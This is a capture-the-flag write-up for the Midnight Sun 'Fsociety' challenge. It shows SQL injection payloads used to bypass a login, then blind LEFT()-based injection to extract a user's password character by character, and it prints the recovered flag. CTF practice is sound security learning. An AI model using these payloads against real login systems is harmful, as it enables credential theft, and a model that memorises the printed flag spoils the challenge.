# Challenge: Fsociety (pwn,cyberz)

The fsociety have a vulnerability in their server login backend, hack them to get elliot's password!

ssh -p2222 fsociety-01.play.midnightsunctf.se 

# My attempt (I didn't solve it)

The ssh server says it is a PHP+MySQL login. So we can try SQL injection.

SQL injection works. Checked with the password:
```
' or 1 = 1 --'
```

Eventhough SQL injection lets us in, there is no TTY allocated.
Instead it attaches to an echo service like process.
I tried to see if there is some format string vulnerability.
But I couldn't find if there is one.
All the common special characters like %x $user, don't do anything special.
They are just printed as they are.

Now the only info that we get is if we are logged in or not.
So we have to use that to find the password.
If we can have something like the following SQL query
```
select password from table where password='password' or password like 'a%';
```

## Testing some SQL

```
' or password like "%"; --'
```
The above query doesn't work. Let's see if " is the problem

```
' or "1" = "1"; --'
```
The above query also doesn't work.

```
' or '1' = '1' --'
' or "1" = "1" --'
```
Semi colon seems to be the problem (not "). Both of the above SQL statement works.

```
' or password like 'm%' --'
```
The above query doesn't work, maybe due to '%' symbol or name of password field being different

```
' or (username = 'elliot' and  1=1 ) --'
```
The above query works

```
' or username like '%' --'
```
Doesn't work

```
' or LEFT(username,2)= 'el' --'
```
Works

```
' or (username = 'elliot' and LEFT(password,1) = "m" ) --'
```
The above query works. Cool

I know that the flag format is midnight{}. So let's try to match that part.

```
' or (username = 'elliot' and LEFT(password,9) = "midnight{" ) --'
```
This also works. The fieldnames are now confirmed ('username' and 'password').
Now for some scripting.

## Script

I wrote a script [login.py](login.py) and It is taking too long.
I think I'm bruteforcing the flag instead of finding it in an easy way. Not sure.

So maybe I should not put the flag in the CTF to avoid cheating.
There should be some other easy way to do it.

The flag is midnight{ba053ffb-cc3c-4ab7-9a85-15a594cc43e9}

But I feel bad for bruteforcing it.
So I'll not post it for the points until I find some other way of finding the password.

I did not find any other way so I didn't upload the flag.
